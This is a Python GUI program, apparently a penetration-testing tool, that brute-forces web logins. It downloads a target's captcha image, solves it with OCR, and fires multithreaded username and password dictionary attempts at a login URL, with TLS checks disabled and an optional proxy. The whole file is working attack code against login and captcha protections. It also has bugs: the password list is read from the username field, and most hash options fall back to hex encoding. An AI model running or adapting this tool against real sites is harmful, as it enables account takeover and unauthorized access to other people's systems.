import ddddocr
import base64
import hashlib
import requests
import os
import sys
import threading
import tkinter as tk
from tkinter import *
from tkinter import ttk
from tkinter.filedialog import askdirectory,askopenfilename
from concurrent.futures import ThreadPoolExecutor, as_completed
requests.packages.urllib3.disable_warnings()

class windowGUI:
	def __init__(self):
		self.windows = tk.Tk()
		self.set_init_windows()
		self.windows.mainloop()
	
	def set_init_windows(self):
		# 定义名称和大小
		self.windows.title("验证码识别爆破__by Longda")
		self.windows.geometry('960x600')
		self.windows.resizable(width=False, height=False)
		self.windows.configure(bg='white')
		self.windows.iconbitmap("favicon.ico")
		# 调用init_toolbar初始化工具条
		self.init_toolbar()
		#创建个主Frame，长在windows上
		mainframe = tk.Frame(self.windows)
		mainframe.pack(fill=BOTH)
		#创建一个上部Frame容器，长在主Frame
		topFrame = tk.Frame(mainframe,height=350,bg='white')
		topFrame.pack(side=TOP, fill=BOTH)
		topFrame.pack_propagate(0)
		#添加个工具条
		toolframe = Frame(mainframe, height=5, bg='lightgray')
		toolframe.pack(fill=X) 
		#创建一个下部Frame容器，长在主Frame上
		bottomFrame = tk.Frame(mainframe,height=244,bg='black')
		bottomFrame.pack(side=TOP, fill=BOTH)
		bottomFrame.pack_propagate(0)
		#将上部分分为左面板
		self.LeftFrame = tk.Frame(topFrame,width=400,bg="white")
		self.LeftFrame.pack(side=LEFT, fill=Y)
		#验证码连接
		self.label1=tk.Label(self.LeftFrame, text="gcodeURL:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label1.grid(row=0, column=0)
		self.label3=tk.Label(self.LeftFrame, text="userDict:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label3.grid(row=1, column=0)
		self.label4=tk.Label(self.LeftFrame, text="passDict:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label4.grid(row=2, column=0)
		self.label5=tk.Label(self.LeftFrame, text="blastURL:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label5.grid(row=3, column=0)
		self.label5=tk.Label(self.LeftFrame, text="method:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label5.grid(row=4, column=0)
		self.label2=tk.Label(self.LeftFrame, text="headers:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label2.grid(row=5, column=0)
		self.label7=tk.Label(self.LeftFrame, text="postData:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label7.grid(row=6, column=0)
		self.label8=tk.Label(self.LeftFrame, text="proxy:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label8.grid(row=7, column=0)

		self.Entry1Text = StringVar(value="")
		self.Entry3Text = StringVar(value="《加载用户名字典》")
		self.Entry4Text = StringVar(value="《加载密码字典》")
		self.Entry8Text = StringVar(value="http://127.0.0.1:8080")

		self.Entry1 = tk.Entry(self.LeftFrame, textvariable=self.Entry1Text, width=50,font=('microsoft yahei', 9),bd=2,exportselection=0,relief=RAISED)
		self.Entry1.grid(row=0, column=1)
		self.Entry3 = tk.Entry(self.LeftFrame, textvariable=self.Entry3Text, width=50,font=('microsoft yahei', 9),bd=2,exportselection=0,relief=RAISED)
		self.Entry3.grid(row=1, column=1)
		self.Entry3.bind('<Button-1>',self.userDict)
		self.Entry4 = tk.Entry(self.LeftFrame, textvariable=self.Entry4Text, width=50,font=('microsoft yahei', 9),bd=2,exportselection=0,relief=RAISED)
		self.Entry4.grid(row=2, column=1)
		self.Entry4.bind('<Button-1>',self.passDict)
		self.Entry5 = tk.Entry(self.LeftFrame, textvariable="", width=50,font=('microsoft yahei', 9),bd=2,exportselection=0,relief=RAISED)
		self.Entry5.grid(row=3, column=1)
		self.Entry6 = ttk.Combobox(self.LeftFrame, width=47,font=('microsoft yahei', 9))
		self.Entry6.grid(row=4, column=1)
		self.Entry6['value'] = ('GET', 'POST')
		self.Entry6.current(1)
		self.Entry6.bind("<<ComboboxSelected>>",self.selectMethod)
		self.Entry2 = tk.Text(self.LeftFrame, height=5,width=50,font=('microsoft yahei', 9),bd=2,exportselection=0)
		self.Entry2.grid(row=5, column=1)
		self.Entry2.insert(tk.INSERT,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8")
		self.Entry7 = tk.Text(self.LeftFrame, height=5,width=50,font=('microsoft yahei', 9),bd=2,exportselection=0)
		self.Entry7.grid(row=6, column=1)
		self.Entry8 = tk.Entry(self.LeftFrame, textvariable=self.Entry8Text, width=50,font=('microsoft yahei', 9),bd=2,exportselection=0,relief=RAISED)
		self.Entry8.grid(row=7, column=1)

		#中间面板
		self.midFrame = tk.Frame(topFrame,width=160,bg="lightgray")
		self.midFrame.pack(side=LEFT, fill=Y)
		tk.Button(self.midFrame, text='gcodeTest',command=self.testCode,font=('microsoft yahei', 9),width=12,bg='green',pady=3).grid(row=0,column=0)
		tk.Button(self.midFrame, text='clearPrint',command=self.clearRespon,font=('microsoft yahei', 9),width=12,bg='green',pady=3).grid(row=1,column=0)
		tk.Button(self.midFrame, text='clearUser',command=self.clearUser,font=('microsoft yahei', 9),width=12,bg='green',pady=3).grid(row=2,column=0)
		tk.Button(self.midFrame, text='clearPass',command=self.clearPass,font=('microsoft yahei', 9),width=12,bg='green',pady=3).grid(row=3,column=0)
		self.Button1 = tk.Button(self.midFrame, text='AddHeader',command=self.addHeaders,font=('microsoft yahei', 9),width=12,bg='green',pady=3)
		self.Button1.grid(row=4,column=0)
		self.Button2 = tk.Button(self.midFrame, text='clearHead',command=self.clearHeader,font=('microsoft yahei', 9),width=12,bg='green',pady=3)
		self.Button2.grid(row=5,column=0)
		tk.Button(self.midFrame, text='Blasting',command=lambda: self.thread_it(self.blasting),font=('microsoft yahei', 9),width=12,bg='green',pady=3).grid(row=6,column=0)
		# tk.Button(self.midFrame, text='stop',command=self.stop,font=('microsoft yahei', 9),width=12,bg='green',pady=3).grid(row=7,column=0)

		#右边面板
		rightFrame = tk.Frame(topFrame,width=400,bg="white")
		rightFrame.pack(side=LEFT, fill=Y)

		self.decodeFrame = tk.Frame(rightFrame,width=400,bg="white")
		self.decodeFrame.pack(side=TOP, fill=X)
		self.label9=tk.Label(self.decodeFrame, text="usersEncode:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label9.pack(side=LEFT)
		self.Entry9 = ttk.Combobox(self.decodeFrame, width=13,font=('microsoft yahei', 9))
		self.Entry9.pack(side=LEFT)
		self.Entry9['value'] = ('None','Hex','Base32','Base64',"MD5","Sha1","Sha224","Sha256","Sha384","Sha512")
		self.Entry9.current(0)
		# self.Entry9.bind("<<ComboboxSelected>>",self.selectCrypt)
		self.label12=tk.Label(self.decodeFrame, text="passwdEncode:",font=('microsoft yahei', 9),width=12,bg='white',pady=3,padx=6)
		self.label12.pack(side=LEFT)
		self.Entry12 = ttk.Combobox(self.decodeFrame, width=13,font=('microsoft yahei', 9))
		self.Entry12.pack(side=LEFT)
		self.Entry12['value'] = ('None','Hex','Base32','Base64',"MD5","Sha1","Sha224","Sha256","Sha384","Sha512")
		self.Entry12.current(0)

		self.userFrame = tk.Frame(rightFrame,width=400,bg="white")
		self.userFrame.pack(side=TOP, fill=X)
		self.label10=tk.Label(self.userFrame, text="userName:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label10.pack(side=LEFT)
		self.Entry10 = tk.Text(self.userFrame, height=8,width=44,font=('microsoft yahei', 9),bd=2,exportselection=0)
		self.Entry10.pack(side=LEFT)
		scrol2 = tk.Scrollbar(self.userFrame)
		scrol2.pack(side=LEFT,fill=Y)
		# 设置滚动条与text组件关联
		scrol2['command'] = self.Entry10.yview
		self.Entry10.configure(yscrollcommand=scrol2.set)

		self.passFrame = tk.Frame(rightFrame,width=400,bg="white")
		self.passFrame.pack(side=TOP, fill=X)
		self.label11=tk.Label(self.passFrame, text="passWord:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label11.pack(side=LEFT)
		self.Entry11 = tk.Text(self.passFrame, height=8,width=44,font=('microsoft yahei', 9),bd=2,exportselection=0)
		self.Entry11.pack(side=LEFT)
		scrol3 = tk.Scrollbar(self.passFrame)
		scrol3.pack(side=LEFT,fill=Y)
		# 设置滚动条与text组件关联
		scrol3['command'] = self.Entry11.yview
		self.Entry11.configure(yscrollcommand=scrol3.set)

		#线程
		self.threakFrame = tk.Frame(rightFrame,width=400,bg="white")
		self.threakFrame.pack(side=TOP, fill=X)
		self.label13=tk.Label(self.threakFrame, text="ThreadNum:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label13.pack(side=LEFT)
		self.Entry13 = ttk.Combobox(self.threakFrame, width=13,font=('microsoft yahei', 9))
		self.Entry13.pack(side=LEFT)
		self.Entry13['value'] = ('1','5','10','15',"20","25","30","50","100")
		self.Entry13.current(1)

		#打印部分面板
		self.respon = tk.Text(bottomFrame, width=134,font=('microsoft yahei', 9),bg='black',fg="lightgreen")
		self.respon.pack(side=LEFT, fill=BOTH)
		self.respon.insert(tk.INSERT,"[+] 简单图形验证码识别爆破工具。\n[+] 1、实现图形验证码识别并账户密码暴力破解。\n[+] 2、$user$、$pass$、$code$ 分别为需要爆破的用户名、密码、图形验证码识别符。\n")
		scroll = tk.Scrollbar(bottomFrame)
		scroll.pack(side=LEFT,fill=Y)
		# 设置滚动条与text组件关联
		scroll['command'] = self.respon.yview
		self.respon.configure(yscrollcommand=scroll.set)

		self.label2.grid_forget()
		self.Entry2.grid_forget()
		self.Button2.grid_forget()

	#爆破
	def blasting(self):
		#默认使用多线程
		#处理hearder
		self.allData = self.getAllData()
		self.headers = self.getHeader()
		self.proxies = {"http":self.allData[6],"https":self.allData[6]}
		self.respon.delete("1.0","end")
		#同时爆破用户名+密码
		if self.allData[1]!="" and self.allData[2]!="":
			userNames = self.getUsers()
			passwds = self.getPasswds()
			encodeUserNames = self.getEncodeUser(self.allData[7],userNames)
			encodePasswds = self.getEncodePass(self.allData[8],passwds)
			if encodeUserNames==None and encodePasswds==None:
				self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t\t|{} \t| {} \t| {} \t|\n".format("USERNAME","PASSWD","GCODE","SCODE","LENGTH"))
				for i in range(len(userNames)):
					with ThreadPoolExecutor(max_workers=int(self.allData[9])) as t:
						for j in range(len(passwds)):
							t.submit(self.doGetRequests_one,[userNames[i],passwds[j],"None"])
						
			elif encodeUserNames!=None and encodePasswds==None:
				self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t\t| {} \t\t\t\t| {} \t| {} \t| {} \t|\n".format("userName","passwd","enUserName","gCode","sCode","length"))
				for i in range(len(userNames)):
					with ThreadPoolExecutor(max_workers=int(self.allData[9])) as t:
						for j in range(len(passwds)):
							t.submit(self.doGetRequests_one,[encodeUserNames[i],passwds[j],userNames[i],"user"])
						
			elif encodeUserNames==None and encodePasswds!=None:
				self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t\t| {} \t\t\t\t| {} \t| {} \t| {} \t|\n".format("userName","passwd","enPasswd","gCode","sCode","length"))
				for i in range(len(userNames)):
					with ThreadPoolExecutor(max_workers=int(self.allData[9])) as t:
						for j in range(len(passwds)):
							t.submit(self.doGetRequests_one,[userNames[i],encodePasswds[j],passwds[j],"pass"])
						
			else:
				self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t\t| {} \t\t\t\t| {} \t\t\t\t| {} \t| {} \t| {} \t|\n".format("userName","passwd","enUserName","enPasswd","gCode","sCode","length"))
				for i in range(len(userNames)):
					with ThreadPoolExecutor(max_workers=int(self.allData[9])) as t:
						for j in range(len(passwds)):
							t.submit(self.doGetRequests_one,[encodeUserNames[i],encodePasswds[j],userNames[i],passwds[j],"all"])
		#只爆破用户名
		elif self.allData[1]!="":
			userNames = self.getUsers()
			encodeUserNames = self.getEncodeUser(self.allData[7],userNames)
			if encodeUserNames != None:
				self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t\t\t\t| {} \t| {} \t| {} \t|\n".format("userName","enUserName","gCode","sCode","length"))
				with ThreadPoolExecutor(max_workers=int(self.allData[9])) as t:
					for i in range(len(encodeUserNames)):
						t.submit(self.doGetRequests,[encodeUserNames[i],userNames[i],"user"])
			else:
				self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t| {} \t| {} \t|\n".format("userName","gCode","sCode","length"))
				with ThreadPoolExecutor(max_workers=int(self.allData[9])) as t:
					for userName in userNames:
						t.submit(self.doGetRequests,[userName,"user"])
		#只爆破密码
		elif self.allData[2]!="":
			passwds = self.getPasswds()
			encodePasswds = self.getEncodePass(self.allData[8],passwds)
			if encodePasswds!=None:
				self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t\t\t\t| {} \t| {} \t| {} \t|\n".format("passwd","enPasswd","gCode","sCode","length"))
				with ThreadPoolExecutor(max_workers=int(self.allData[9])) as t:
					for i in range(len(encodePasswds)):
						t.submit(self.doGetRequests,[encodePasswds[i],passwds[i],"pass"])
					
			else:
				self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t| {} \t| {} \t|\n".format("passwd","gCode","sCode","length"))
				with ThreadPoolExecutor(max_workers=int(self.allData[9])) as t:

					for passwd in passwds:
						t.submit(self.doGetRequests,[passwd,"pass"])			
		#未指定参数
		else:
			self.respon.insert(tk.INSERT,"\n[+] 还未选择爆破的参数")

	#blasting userName+passwd
	def doGetRequests_one(self,dataList):
		if self.allData[4]=="GET":
			if self.Entry1.get()!="" and "$code$" in self.allData[3]:
				code = self.getCode(self.allData[0])
				url = self.allData[3].replace("$user$",dataList[0]).replace("$pass$",dataList[1]).replace("$code$",code)
			else:
				url = self.allData[3].replace("$user$",dataList[0]).replace("$pass$",dataList[1])
			try:
				res = requests.get(url = url,headers = self.headers,proxies=self.proxies,allow_redirects=False,verify=False,timeout=5)
				if len(dataList)==3:
					result = [dataList[0],dataList[1],code,str(res.status_code),str(len(res.text))]
					self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t\t| {} \t| {} \t| {} \t|".format(result[0],result[1],result[2],result[3],result[4]))
					return 0
				elif len(dataList)==4:
					result = [dataList[0],dataList[1],dataList[2],code,str(res.status_code),str(len(res.text))]
					if dataList[3]=="user":
						self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t\t| {} \t\t\t\t| {} \t| {} \t| {} \t|".format(result[2],result[1],result[0],result[3],result[4],result[5]))
					elif dataList[3]=="pass":
						self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t\t| {} \t\t\t\t| {} \t| {} \t| {} \t|".format(result[0],result[2],result[1],result[3],result[4],result[5]))
					return 0
				elif len(dataList)==5:
					result = [dataList[0],dataList[1],dataList[2],dataList[3],code,str(res.status_code),str(len(res.text))]
					self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t\t| {} \t\t\t\t| {} \t\t\t\t| {} \t| {} \t| {} \t|".format(result[2],result[3],result[0],result[1],result[4],result[5],result[6]))
					return 0
			except Exception as e:
				return 0
		elif self.allData[4]=="POST":
			url = self.allData[3]
			if self.Entry1.get()!="" and "$code$" in self.allData[5]:
				code = self.getCode(self.allData[0])
				postData = self.allData[5].replace("$user$",dataList[0]).replace("$pass$",dataList[1]).replace("$code$",code)
			else:
				postData = self.allData[5].replace("$user$",dataList[0]).replace("$pass$",dataList[1])
			try:
				res = requests.post(url=url,data=postData,headers=self.headers,proxies=self.proxies,allow_redirects=False,verify=False,timeout=5)
				if len(dataList)==3:
					result = [dataList[0],dataList[1],code,str(res.status_code),str(len(res.text))]
					self.respon.insert(tk.INSERT,"\n| {0} \t\t| {1} \t\t| {2} \t| {3} \t| {4} \t|".format(result[0],result[1],result[2],result[3],result[4]))
					return 0
				elif len(dataList)==4:
					result = [dataList[0],dataList[1],dataList[2],code,str(res.status_code),str(len(res.text))]
					if dataList[3]=="user":
						self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t\t| {} \t\t\t\t| {} \t| {} \t| {} \t|".format(result[2],result[1],result[0],result[3],result[4],result[5]))
					elif dataList[3]=="pass":
						self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t\t| {} \t\t\t\t| {} \t| {} \t| {} \t|".format(result[0],result[2],result[1],result[3],result[4],result[5]))
					return 0
				elif len(dataList)==5:
					result = [dataList[0],dataList[1],dataList[2],dataList[3],code,str(res.status_code),str(len(res.text))]
					self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t\t| {} \t\t\t\t| {} \t\t\t\t| {} \t| {} \t| {} \t|".format(result[2],result[3],result[0],result[1],result[4],result[5],result[6]))
					return 0
			except Exception as e:
				print(f"[-] {e}")
				return 0

	#blasting userName/passwd
	def doGetRequests(self,data):
		if self.allData[4]=="GET":
			if self.Entry1.get()!="" and "$code$" in self.allData[3]:
				code = self.getCode(self.allData[0])
				if data[-1] == "user":
					url = self.allData[3].replace("$user$",data[0]).replace("$code$",code)
				else:
					url = self.allData[3].replace("$pass$",data[0]).replace("$code$",code)
			else:
				if data[-1] == "user":
					url = self.allData[3].replace("$user$",data[0])
				else:
					url = self.allData[3].replace("$pass$",data[0])
			try:
				res = requests.get(url = url,headers = self.headers,proxies=self.proxies,allow_redirects=False,verify=False,timeout=5)
				if len(data)==2:
					result = [data[0],str(res.status_code),str(len(res.text))]
					self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t| {} \t| {} \t|".format(result[0],result[1],result[2],result[3]))
					return 0
				elif len(data)==3:
					result = [data[0],data[1],code,str(res.status_code),str(len(res.text))]
					self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t\t\t\t| {} \t| {} \t| {} \t|".format(result[1],result[0],result[2],result[3],result[4]))
					return 0
			except Exception as e:
				return 0
		elif self.allData[4]=="POST":
			url = self.allData[3]
			if self.Entry1.get()!="" and "$code$" in self.allData[5]:
				code = self.getCode(self.allData[0])
				if data[-1]=="user":
					postData = self.allData[5].replace("$user$",data[0]).replace("$code$",code)
				else:
					postData = self.allData[5].replace("$pass$",data[0]).replace("$code$",code)
			else:
				if data[-1]=="user":
					postData = self.allData[5].replace("$user$",data[0])
				else:
					postData = self.allData[5].replace("$pass$",data[0])
			try:
				res = requests.post(url=url,data=postData,headers=self.headers,proxies=self.proxies,allow_redirects=False,verify=False,timeout=5)
				if len(data)==2:
					result = [data[0],str(res.status_code),str(len(res.text))]
					self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t| {} \t| {} \t|".format(result[0],result[1],result[2],result[3]))
					return 0
				elif len(data)==3:
					result = [data[0],data[1],code,str(res.status_code),str(len(res.text))]
					self.respon.insert(tk.INSERT,"\n| {} \t\t| {} \t\t\t\t| {} \t| {} \t| {} \t|".format(result[1],result[0],result[2],result[3],result[4]))
					return 0
			except Exception as e:
				return 0

	#getUsernames
	def getUsers(self):
		usersData = self.Entry10.get("1.0","end")
		temp = usersData.split("\n")
		userNames = []
		for userName in temp:
			if userName != "":
				userNames.append(userName)
		return userNames

	#getPasswd
	def getPasswds(self):
		passwdsData = self.Entry10.get("1.0","end")
		temp = passwdsData.split("\n")
		Passwds = []
		for passwd in temp:
			if passwd != "":
				Passwds.append(passwd)
		return Passwds

	#getPassEncode
	def getEncodePass(self,encodetype,passwds):
		if encodetype=="Hex":
			encodePasswds = self.hexEncode(passwds)
			return encodePasswds
		elif encodetype=="Base32":
			encodePasswds = self.bs32Encode(passwds)
			return encodePasswds
		elif encodetype=="Base64":
			encodePasswds = self.hexEncode(passwds)
			return encodePasswds
		elif encodetype=="MD5":
			encodePasswds = self.hexEncode(passwds)
			return encodePasswds
		elif encodetype=="Sha1":
			encodePasswds = self.hexEncode(passwds)
			return encodePasswds
		elif encodetype=="Sha224":
			encodePasswds = self.hexEncode(passwds)
			return encodePasswds
		elif encodetype=="Sha256":
			encodePasswds = self.hexEncode(passwds)
			return encodePasswds
		elif encodetype=="Sha384":
			encodePasswds = self.hexEncode(passwds)
			return encodePasswds
		elif encodetype=="Sha512":
			encodePasswds = self.hexEncode(passwds)
			return encodePasswds
		else:
			return None
		
	#getUserEncode
	def getEncodeUser(self,encodetype,userNames):
		if encodetype=="Hex":
			encodeUserNames = self.hexEncode(userNames)
			return encodeUserNames
		elif encodetype=="Base32":
			encodeUserNames = self.bs32Encode(userNames)
			return encodeUserNames
		elif encodetype=="Base64":
			encodeUserNames = self.hexEncode(userNames)
			return encodeUserNames
		elif encodetype=="MD5":
			encodeUserNames = self.hexEncode(userNames)
			return encodeUserNames
		elif encodetype=="Sha1":
			encodeUserNames = self.hexEncode(userNames)
			return encodeUserNames
		elif encodetype=="Sha224":
			encodeUserNames = self.hexEncode(userNames)
			return encodeUserNames
		elif encodetype=="Sha256":
			encodeUserNames = self.hexEncode(userNames)
			return encodeUserNames
		elif encodetype=="Sha384":
			encodeUserNames = self.hexEncode(userNames)
			return encodeUserNames
		elif encodetype=="Sha512":
			encodeUserNames = self.hexEncode(userNames)
			return encodeUserNames
		else:
			return None

	#加密
	def sha512Encode(self,dataList):
		temp = []
		m = hashlib.sha512()
		for data in dataList:
			m.update(data.encode("utf-8"))
			temp.append(m.hexdigest())
		return temp

	def sha384Encode(self,dataList):
		temp = []
		m = hashlib.sha384()
		for data in dataList:
			m.update(data.encode("utf-8"))
			temp.append(m.hexdigest())
		return temp

	def sha256Encode(self,dataList):
		temp = []
		m = hashlib.sha256()
		for data in dataList:
			m.update(data.encode("utf-8"))
			temp.append(m.hexdigest())
		return temp

	def sha224Encode(self,dataList):
		temp = []
		m = hashlib.sha224()
		for data in dataList:
			m.update(data.encode("utf-8"))
			temp.append(m.hexdigest())
		return temp

	def sha1Encode(self,dataList):
		temp = []
		m = hashlib.sha1()
		for data in dataList:
			m.update(data.encode("utf-8"))
			temp.append(m.hexdigest())
		return temp

	def MD5Encode(self,dataList):
		temp = []
		m = hashlib.md5()
		for data in dataList:
			m.update(data.encode("utf-8"))
			temp.append(m.hexdigest())
		return temp

	def bs64Encode(self,dataList):
		temp = []
		for data in dataList:
			temp.append(str(base64.b64encode(data.encode("utf-8")),"utf-8"))
		return temp

	def bs32Encode(self,dataList):
		temp = []
		for data in dataList:
			temp.append(str(base64.b32encode(data.encode("utf-8")),"utf-8"))
		return temp

	def hexEncode(self,dataList):
		temp = []
		for data in dataList:
			temp.append(str(base64.b16encode(data.encode("utf-8")),"utf-8"))
		return temp

	#get self.allData
	def getAllData(self):
		codeUrl = self.Entry1.get().strip("\n")
		userDict = self.Entry3.get()
		passDict = self.Entry4.get()
		url = self.Entry5.get().strip("\n")
		method = self.Entry6.get()
		postData = self.Entry7.get("1.0","end").strip("\n")
		proxy = self.Entry8.get().strip("\n")
		userEncode = self.Entry9.get()
		passEncode = self.Entry12.get()
		tNum = self.Entry13.get()
		return [codeUrl,userDict,passDict,url,method,postData,proxy,userEncode,passEncode,tNum]

	#getcode
	def getCode(self,codeUrl):
		code = "None"
		if self.Entry1.get()!="":
			ocr = ddddocr.DdddOcr(use_gpu=True,device_id=1)
			try:
				re = requests.get(url=codeUrl,verify=False)
				code = ocr.classification(re.content)
			except Exception as e:
				pass
		return code

	#header
	def getHeader(self):
		headData = self.Entry2.get("1.0","end")
		keys = []
		values = []
		if headData!="":
			headerList = headData.split("\n")
		for header in headerList:
			if header != "":
				index = header.strip().index(":")
				keys.append(header.strip()[:index])
				values.append(header.strip()[index+1:].strip())
		return dict(zip(keys,values))

	#用户名字典
	def userDict(self,event):
		usernamefile = askopenfilename(title="select user dict",filetypes=[("TXT","*.txt")])
		fileName = usernamefile.split("/")[-1]
		if usernamefile:
			self.Entry3Text.set(fileName)
			userNames = self.readfile(usernamefile)
			for userName in userNames:
				self.Entry10.insert(tk.INSERT,userName+"\n")
		# else:
		# 	self.Entry3Text.set("")

	#密码字典
	def passDict(self,event):
		passwdfile = askopenfilename(title="select passwd dict",filetypes=[("TXT","*.txt")])
		fileName = passwdfile.split("/")[-1]
		if passwdfile:
			self.Entry4Text.set(fileName)
			passWDs = self.readfile(passwdfile)
			for passwd in passWDs:
				self.Entry11.insert(tk.INSERT,passwd+"\n")
		# else:
		# 	self.Entry4Text.set("")

	#读文件
	def readfile(self,filename):
		datas = []
		with open(filename,"r") as f:
			line = f.readline()
			while line:
				datas.append(line.strip("\n"))
				line = f.readline()
		return datas

	#清空
	def clearRespon(self):

		self.respon.delete("1.0","end")

	def clearUser(self):
		self.Entry10.delete("1.0","end")
		# self.Entry3Text.set("")

	def clearPass(self):
		self.Entry11.delete("1.0","end")
		# self.Entry4Text.set("")

	#测试验证码识别
	def testCode(self):
		if self.Entry1.get()!="":
			ocr = ddddocr.DdddOcr(use_gpu=True,device_id=1)
			re = requests.get(url=self.Entry1.get())
			res = ocr.classification(re.content)
			self.respon.delete("1.0","end")
			self.respon.insert(tk.INSERT,"\n[+] 图形码：{}".format(res))

	#headers
	def addHeaders(self):
		self.label2.grid(row=5, column=0)
		self.Entry2.grid(row=5, column=1)
		self.Button1.grid_forget()
		self.Button2.grid(row=5,column=0)

	def clearHeader(self):
		self.label2.grid_forget()
		self.Entry2.grid_forget()
		self.Button1.grid(row=4,column=0)
		self.Button2.grid_forget()

	#method
	def selectMethod(self,event):
		if self.Entry6.get() == "GET":
			self.Entry7.grid_forget()
			self.label7.grid_forget()

		if self.Entry6.get() == "POST":
			self.Entry7.grid(row=6, column=1)
			self.label7.grid(row=6, column=0)

	#初始化工具条函数
	def init_toolbar(self):
		# 创建并添加一个Frame作为工具条的容器
		toolframe = Frame(self.windows, height=2, bg='lightgray')
		# 该Frame容器放在窗口顶部
		toolframe.pack(fill=X)

	#线程减缓页面卡死
	# @staticmethod
	def thread_it(self, func, *args):
		t = threading.Thread(target=func, args=args) 
		# 守护--就算主界面关闭，线程也会留守后台运行（不对!）
		t.setDaemon(True)
		# 启动
		t.start()

if __name__ == '__main__':
	windowGUI()
